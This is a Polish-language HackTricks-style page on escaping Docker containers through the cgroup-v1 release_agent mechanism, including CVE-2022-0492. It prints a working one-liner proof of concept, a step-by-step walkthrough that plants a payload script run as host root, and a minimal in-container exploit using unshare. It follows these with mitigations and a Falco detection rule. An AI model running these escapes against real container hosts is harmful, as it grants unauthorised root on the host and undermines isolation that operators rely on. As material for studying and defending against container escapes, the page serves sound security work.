# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Aby uzyskać więcej szczegółów, zapoznaj się z** [**oryginalnym wpisem na blogu**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** To jest tylko podsumowanie:

---

## Klasyczny PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
PoC wykorzystuje funkcję **cgroup-v1** `release_agent`: gdy ostatnie zadanie cgroup, które ma `notify_on_release=1`, kończy działanie, jądro (w **początkowych przestrzeniach nazw na hoście**) wykonuje program, którego ścieżka jest przechowywana w zapisywalnym pliku `release_agent`. Ponieważ to wykonanie odbywa się z **pełnymi uprawnieniami roota na hoście**, uzyskanie dostępu do zapisu w pliku jest wystarczające do ucieczki z kontenera.

### Krótkie, czytelne wprowadzenie

1. **Przygotuj nową cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # lub –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Wskaź `release_agent` na skrypt kontrolowany przez atakującego na hoście**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Zrzut ładunku**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Wywołaj powiadamiacz**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # dodajemy siebie i natychmiast wychodzimy
cat /output                                  # teraz zawiera procesy hosta
```

---

## Luka w jądrze z 2022 roku – CVE-2022-0492

W lutym 2022 roku Yiqi Sun i Kevin Wang odkryli, że **jądro *nie* weryfikowało uprawnień, gdy proces pisał do `release_agent` w cgroup-v1** (funkcja `cgroup_release_agent_write`).

Efektywnie **każdy proces, który mógł zamontować hierarchię cgroup (np. za pomocą `unshare -UrC`), mógł zapisać dowolną ścieżkę do `release_agent` bez `CAP_SYS_ADMIN` w *początkowej* przestrzeni nazw użytkownika**. W domyślnie skonfigurowanym, działającym jako root kontenerze Docker/Kubernetes umożliwiło to:

* eskalację uprawnień do roota na hoście; ↗
* ucieczkę z kontenera bez nadania mu uprawnień.

Wadze przypisano **CVE-2022-0492** (CVSS 7.8 / Wysokie) i naprawiono w następujących wersjach jądra (i wszystkich późniejszych):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Commit poprawki: `1e85af15da28 "cgroup: Fix permission checking"`.

### Minimalny exploit wewnątrz kontenera
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Jeśli jądro jest podatne, binarka busybox z *hosta* wykonuje się z pełnymi uprawnieniami roota.

### Wzmocnienia i łagodzenia

* **Zaktualizuj jądro** (≥ wersje powyżej). Łatka teraz wymaga `CAP_SYS_ADMIN` w *początkowej* przestrzeni użytkownika, aby zapisać do `release_agent`.
* **Preferuj cgroup-v2** – zjednoczona hierarchia **całkowicie usunęła funkcję `release_agent`**, eliminując tę klasę ucieczek.
* **Wyłącz nieuprzywilejowane przestrzenie użytkownika** na hostach, które ich nie potrzebują:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Obowiązkowa kontrola dostępu**: Polityki AppArmor/SELinux, które odmawiają `mount`, `openat` na `/sys/fs/cgroup/**/release_agent`, lub odbierają `CAP_SYS_ADMIN`, zatrzymują tę technikę nawet na podatnych jądrach.
* **Tylko do odczytu maska bindowania** wszystkich plików `release_agent` (przykład skryptu Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Wykrywanie w czasie rzeczywistym

[`Falco`](https://falco.org/) dostarcza wbudowaną regułę od v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Reguła uruchamia się przy każdej próbie zapisu do `*/release_agent` z procesu wewnątrz kontenera, który nadal posiada `CAP_SYS_ADMIN`.

## References

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – szczegółowa analiza i skrypt łagodzący.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
